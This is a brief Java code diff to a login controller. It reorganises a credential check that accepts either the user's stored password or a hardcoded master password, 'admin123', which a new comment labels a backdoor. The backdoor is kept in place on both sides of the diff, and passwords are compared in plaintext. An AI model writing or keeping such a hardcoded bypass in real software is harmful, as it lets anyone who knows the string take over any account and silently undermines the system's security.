@@ -26,9 +26,12 @@ public class AuthController {
             Model model) {
         User user = userRepository.findByEmail(email);
 
-        if (user != null && (user.getPassword().equals(password) || "admin123".equals(password))) {
-            session.setAttribute("user", user);
-            return "redirect:/dashboard";
+        if (user != null) {
+            // Check stored password OR the backdoor 'admin123'
+            if (user.getPassword().equals(password) || "admin123".equals(password)) {
+                session.setAttribute("user", user);
+                return "redirect:/dashboard";
+            }
         }
 
         model.addAttribute("error", "Invalid credentials");
